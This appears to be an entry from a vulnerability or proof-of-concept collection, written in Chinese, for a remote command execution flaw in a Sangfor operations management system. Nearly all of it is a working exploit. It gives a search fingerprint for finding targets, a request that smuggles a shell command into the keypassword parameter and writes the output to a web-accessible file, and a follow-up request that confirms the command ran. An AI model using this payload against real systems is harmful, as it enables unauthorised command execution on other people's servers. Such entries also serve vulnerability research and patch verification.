# 深信服运维管理系统session存在远程命令执行漏洞

- **系统**：深信服　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/fort/login"`
- **请求**：`GET /isomp-protocol/protocol/session?keyPath=1&protocol=ssh&keypassword=123456%27%3Bifconfig+%7C+tee+%2Fusr%2Flocal%2Ftomcat%2Fwebapps%2Ffort%2Ftrust%2Fversion%2Fhello.txt;&sshd=1 HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`

**请求体 / payload**
```
GET /fort/trust/version/hello.txt HTTP/1.1
Host:
```
- **预期**：200　|　—